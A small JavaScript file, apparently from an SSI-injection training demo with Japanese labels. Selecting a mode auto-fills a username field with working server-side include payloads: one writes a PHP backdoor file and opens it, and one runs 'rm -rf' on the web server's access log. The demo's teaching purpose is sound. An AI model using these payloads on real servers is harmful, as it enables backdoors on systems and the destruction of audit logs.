(function(){
  "use strict";

  //Valiable
    let selectMethodMsg = {
      '1':"想定されたケースでユーザー名を入力します",
      '2':"SSIコードを埋めこみ不正にシステム情報を入手します",
      '3':"SSIコードを埋めこみサーバーにバックドアを作成。システム情報を削除します"
    };

  //Event

    $("select[name='method']").on("change", changeMethod);

    $("#send_button").on("click", clickSendButton);

  //Method

    function changeMethod(e){
      var mcode = $("select[name='method']").val();
      var domain = $("#server_name").val();
      $("#selectMsg").html(selectMethodMsg[mcode]);
      $("#mcode").val(mcode);
      //auto input
      switch(mcode){
        case "1":
          $("#user_name").val("poul");
          break;
        case "2":
          $("#user_name").val("<!–#exec cmd=\"echo '<?php phpinfo(); ?>'> backdoor.php\"->");
          break;
        case "3":
          $("#user_name").val("<!–#exec cmd=\"rm -rf /var/log/httpd/access_log\"->");
          break;
      }
    }

    function clickSendButton(){
      $("#form1").attr("action", "#");
      $("#form1").submit();

    }
    function accessBackdoor(){
        if($("#send_mcode").val() === "2"){
          window.open("backdoor.php");
        }
    }

    function scrollDown(){
      if($("#scroll_down").val() === "1"){
        $('html, body').animate({scrollTop:document.body.offsetHeight});
      }
    }

  //Init

    scrollDown();
    accessBackdoor();

})();